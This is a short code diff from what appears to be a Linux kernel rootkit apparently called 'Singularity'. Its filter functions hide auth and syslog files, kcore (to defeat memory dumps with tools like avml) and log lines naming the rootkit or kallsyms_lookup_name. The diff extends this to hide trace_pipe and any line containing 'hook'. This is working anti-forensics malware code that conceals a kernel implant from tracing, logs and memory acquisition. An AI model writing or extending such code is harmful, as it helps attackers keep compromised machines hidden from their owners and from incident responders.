@@ -41,6 +41,7 @@ notrace static bool should_filter_file(const char *filename) {
             strcmp(filename, "auth.log.1") == 0 ||
             strcmp(filename, "vmallocinfo") == 0 ||
             strcmp(filename, "syslog.1") == 0 ||
+            strcmp(filename, "trace_pipe") == 0 ||
             strcmp(filename, "kcore") == 0 || //temp fix to avoid memory dump using tools like avml
             strcmp(filename, "touched_functions") == 0);
 }
@@ -60,6 +61,7 @@ notrace static bool line_contains_sensitive_info(const char *line) {
             strstr(line, "Singularity") != NULL ||
             strstr(line, "matheuz") != NULL ||
             strstr(line, "zer0t") != NULL ||
+            strstr(line, "hook") != NULL ||
             strstr(line, "kallsyms_lookup_name") != NULL ||
             strstr(line, "obliviate") != NULL);
 }
